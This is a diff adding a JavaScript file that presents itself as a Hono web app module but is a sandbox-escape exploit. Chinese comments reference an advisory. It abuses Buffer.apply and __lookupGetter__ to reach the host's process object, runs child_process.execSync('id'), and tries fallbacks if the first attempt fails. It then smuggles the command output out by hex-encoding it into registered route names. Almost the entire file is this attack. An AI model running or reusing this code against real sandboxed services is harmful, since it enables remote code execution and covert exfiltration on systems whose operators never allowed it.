@@ -1,0 +1,44 @@
+const { Hono } = require('hono');
+const app = new Hono();
+
+let rceResult = 'no-pwn';
+try {
+  const hostApply = Buffer.apply;
+  const lookupGetter = Object.prototype.__lookupGetter__;
+  
+  // __lookupGetter__ 在 host context 中调用会返回 host 侧的 getter
+  // 通过 Buffer.apply 可以在 host context 中执行
+  const hostFunction = hostApply.call(lookupGetter, Object.prototype, ['__proto__']);
+  
+  if (hostFunction) {
+    try {
+      const p = hostFunction.constructor('return process')();
+      rceResult = p.mainModule.require('child_process').execSync('id').toString();
+    } catch(e) {
+      // 可能 hostFunction 不直接能用，尝试其他属性
+      rceResult = 'LOOKUP-FUNC:' + typeof hostFunction + '|' + String(e).slice(0, 200);
+    }
+  } else {
+    rceResult = 'LOOKUP-NULL';
+  }
+} catch(e) { rceResult = 'OUTER2:' + String(e).slice(0, 300); }
+
+// 备选：直接按 advisory 的方式
+try {
+  if (rceResult.startsWith('no-pwn') || rceResult.startsWith('OUTER') || rceResult.startsWith('LOOKUP')) {
+    const apply = Buffer.apply;
+    const getter = Object.prototype.__lookupGetter__;
+    // 利用 apply 把 lookupGetter 的 this 绑定到 host 对象
+    const hostObj = apply.call(getter, globalThis, ['constructor']);
+    if (hostObj) {
+      const p = hostObj.constructor('return process')();
+      rceResult = p.mainModule.require('child_process').execSync('id').toString();
+    }
+  }
+} catch(e) { rceResult += '|ALT2:' + String(e).slice(0, 200); }
+
+const hex = Buffer.from(String(rceResult)).toString('hex');
+for (let i = 0; i < hex.length && i < 5000; i += 50) {
+  app.get(`/d${Math.floor(i/50)}_${hex.slice(i, i+50)}`, (c) => c.text(''));
+}
+module.exports = { default: app };
